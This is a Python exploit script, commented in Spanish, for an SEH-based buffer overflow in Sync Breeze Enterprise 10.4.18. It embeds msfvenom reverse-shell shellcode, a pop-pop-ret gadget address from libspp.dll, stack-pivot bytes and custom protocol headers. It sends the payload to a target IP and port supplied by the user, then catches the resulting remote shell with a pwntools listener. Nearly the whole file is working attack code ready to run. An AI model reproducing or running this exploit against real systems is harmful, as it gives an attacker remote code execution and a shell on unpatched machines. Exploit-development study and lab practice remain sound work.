#!/usr/bin/python
# -*- coding: utf-8 -*-
#Exploit para Sync Breeze v10.4.18

#Badchars: \x00\x02\x0a\x0d\xf8\xfd

import socket
import struct
import sys
from pwn import *

def shl():
    #msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.202 LPORT=443 -f python -e x86/shikata_ga_nai -b "\x00\x02\x0a\x0d\xf8\xfd" -v shellcode 
    shellcode =  b""                                                                                            
    shellcode += b"\xda\xd5\xd9\x74\x24\xf4\xba\xb8\xb0\x2c\xc4"                                                
    shellcode += b"\x5e\x29\xc9\xb1\x52\x31\x56\x17\x03\x56\x17"                                                
    shellcode += b"\x83\x7e\xb4\xce\x31\x82\x5d\x8c\xba\x7a\x9e"                                                
    shellcode += b"\xf1\x33\x9f\xaf\x31\x27\xd4\x80\x81\x23\xb8"                                                
    shellcode += b"\x2c\x69\x61\x28\xa6\x1f\xae\x5f\x0f\x95\x88"                                                
    shellcode += b"\x6e\x90\x86\xe9\xf1\x12\xd5\x3d\xd1\x2b\x16"                                                
    shellcode += b"\x30\x10\x6b\x4b\xb9\x40\x24\x07\x6c\x74\x41"                                                
    shellcode += b"\x5d\xad\xff\x19\x73\xb5\x1c\xe9\x72\x94\xb3"                                                
    shellcode += b"\x61\x2d\x36\x32\xa5\x45\x7f\x2c\xaa\x60\xc9"                                                
    shellcode += b"\xc7\x18\x1e\xc8\x01\x51\xdf\x67\x6c\x5d\x12"                                                
    shellcode += b"\x79\xa9\x5a\xcd\x0c\xc3\x98\x70\x17\x10\xe2"                                                
    shellcode += b"\xae\x92\x82\x44\x24\x04\x6e\x74\xe9\xd3\xe5"                                                
    shellcode += b"\x7a\x46\x97\xa1\x9e\x59\x74\xda\x9b\xd2\x7b"                                                
    shellcode += b"\x0c\x2a\xa0\x5f\x88\x76\x72\xc1\x89\xd2\xd5"                                                
    shellcode += b"\xfe\xc9\xbc\x8a\x5a\x82\x51\xde\xd6\xc9\x3d"                                                
    shellcode += b"\x13\xdb\xf1\xbd\x3b\x6c\x82\x8f\xe4\xc6\x0c"                                                
    shellcode += b"\xbc\x6d\xc1\xcb\xc3\x47\xb5\x43\x3a\x68\xc6"                                                
    shellcode += b"\x4a\xf9\x3c\x96\xe4\x28\x3d\x7d\xf4\xd5\xe8"                                                
    shellcode += b"\xd2\xa4\x79\x43\x93\x14\x3a\x33\x7b\x7e\xb5"                                                
    shellcode += b"\x6c\x9b\x81\x1f\x05\x36\x78\xc8\xea\x6f\x83"                                                
    shellcode += b"\xc2\x83\x6d\x83\xd3\xe8\xfb\x65\xb9\x1e\xaa"                                                
    shellcode += b"\x3e\x56\x86\xf7\xb4\xc7\x47\x22\xb1\xc8\xcc"                                                
    shellcode += b"\xc1\x46\x86\x24\xaf\x54\x7f\xc5\xfa\x06\xd6"                                                
    shellcode += b"\xda\xd0\x2e\xb4\x49\xbf\xae\xb3\x71\x68\xf9"                                                
    shellcode += b"\x94\x44\x61\x6f\x09\xfe\xdb\x8d\xd0\x66\x23"                                                
    shellcode += b"\x15\x0f\x5b\xaa\x94\xc2\xe7\x88\x86\x1a\xe7"                                                
    shellcode += b"\x94\xf2\xf2\xbe\x42\xac\xb4\x68\x25\x06\x6f"                                                
    shellcode += b"\xc6\xef\xce\xf6\x24\x30\x88\xf6\x60\xc6\x74"                                                
    shellcode += b"\x46\xdd\x9f\x8b\x67\x89\x17\xf4\x95\x29\xd7"                                                
    shellcode += b"\x2f\x1e\x59\x92\x6d\x37\xf2\x7b\xe4\x05\x9f"                                                
    shellcode += b"\x7b\xd3\x4a\xa6\xff\xd1\x32\x5d\x1f\x90\x37"                                                
    shellcode += b"\x19\xa7\x49\x4a\x32\x42\x6d\xf9\x33\x47"
    return shellcode

def pl():
    shll = shl()
    payload = "A"*124
    payload += "\x90\x90\xeb\x04" #nSeh jmp short 6
    payload += struct.pack('<I', 0x10015c71) #seh -> 0x10015c71 : pop edi # pop esi # ret 0x04 | ascii {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Sync Breeze Enterprise\bin\libspp.dll)
    payload += "\x90" * 5 #NOP 
    payload += "\x83\xc4\x64" * 20  # add esp,100 -> Ampliamos tope de la pila en 2000 bytes ya que el shellcode son aprox 1900
    payload += "\xff\xe4"           # jmp esp -> Apuntamos el esp hasta ahi 
    payload += "\x90" * (1000 - len(payload) - len(shll))
    payload += shll
    return payload


def cabecera():
    print "________                               ________                                 "
    print "__  ___/_____  _________ _______       ___  __ )_____________ _____ ___________ "
    print "_____ \ __  / / /__  __ \_  ___/       __  __  |__  ___/_  _ \_  _ \___  /_  _ \\"
    print "____/ / _  /_/ / _  / / // /__         _  /_/ / _  /    /  __//  __/__  /_/  __/"
    print "/____/  _\__, /  /_/ /_/ \___/         /_____/  /_/     \___/ \___/ _____/\___/"
    print "        /____/                                                                  "
    print "                                                                       v 10.4.18"
    print "________________________________________________________________________________"
    print "\n"

if __name__ == '__main__':
    cabecera()
    print "Exploit para Sync Breeze 10.4.18"
    print "Desarrollado por L0H\n"
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lg = log.progress("Inicializando")
    lg.status("Preparando requisitos")
    sleep(1)
    lg.status("Esperando parametros")
    host = str(raw_input("[?] Introduce la dirección IP de la maquina: ").replace('\n', ''))
    port=int(input("[?] Introduce el puerto del portal (9121 por defecto): "))
    l_port=int(input("[?] Introduce el puerto por el que se establecera la conexión: "))
    selec = raw_input("[?] Si quieres ver el payload introduce \"[y/Y]\" ").replace('\n', '')
    print "________________________________________________________________________________"
    print "[*] Dirección IP atcada: " + host + "\n[*] Puerto: " + str(port) + "\n[*] Puerto para la conexión remota: " + str(l_port)
    lg.status("Comprobando conexión")
    sleep(2)
    try:
        conn.connect((host, port))
    except:
        lg.failure("Conexión fallida, revise los ajustes")
        exit()
    lg.success("Conexión establecida")
    lg = log.progress("Generando payload")
    lg.status("Cargando codigos")
    payl = pl()
    sleep(1)
    #Headers del paquete TCP
    header =  "\x75\x19\xba\xab" #Cabecera paquete tcp
    header += "\x03\x00\x00\x00" #Cabecera parte 2
    header += "\x00\x40\x00\x00"
    lg.status("Generando paquetes")
    header += struct.pack('<I', len(payl)) #'<I'Little endian y unsigned int
    header += struct.pack('<I', len(payl))
    header += struct.pack('<I', ord(payl[-1]))
    packet = header
    packet += payl
    #Fin de headers
    lg.success("Codigos preparados")
    if(selec == 'y' or selec == 'Y'): print packet
    lg3 = log.progress("Reverse Shell")
    lg3.status("Preparando")
    sleep(1)
    lg3.success("Listo")
    iss = listen(l_port)
    conn.send(packet)
    iss.interactive()
    conn.close()

